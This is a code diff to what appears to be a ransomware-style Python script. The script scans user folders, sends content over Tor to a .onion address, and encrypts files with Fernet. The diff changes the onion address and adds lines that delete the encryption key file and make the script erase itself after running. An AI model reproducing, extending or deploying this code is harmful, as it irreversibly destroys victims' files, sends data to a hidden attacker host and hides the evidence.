@@ -1,6 +1,7 @@
 import socket
 from cryptography.fernet import Fernet
 import os
+import sys
 from pathlib import Path
 
 def scan_user_folders():
@@ -26,7 +27,7 @@ if __name__ == "__main__":
     proxy_host = "127.0.0.1"
     proxy_port = 9050
 
-    onion_address = "fkoddwbl6lzuphjtbobo5fiqdjqkw56l6e6lqpkwuk2p4sn3lw64wxad.onion"
+    onion_address = "74lt2oxpplb5xhd3aogllmzzfjd2pk7bytp7vciou4auumspijhbqvid.onion"
     onion_port = 12345
 
     message = content
@@ -71,5 +72,11 @@ if __name__ == "__main__":
             print(f"Encrypted {file}")
         except Exception as e:
             print(f"Failed to encrypt {file}: {e}")
+
+    os.remove("key.key")
+    filename = sys.argv[0]
+    # Spawn a new process to delete this file after a delay
+    os.system(f"sleep 1 && rm {filename} &")
+
 
 
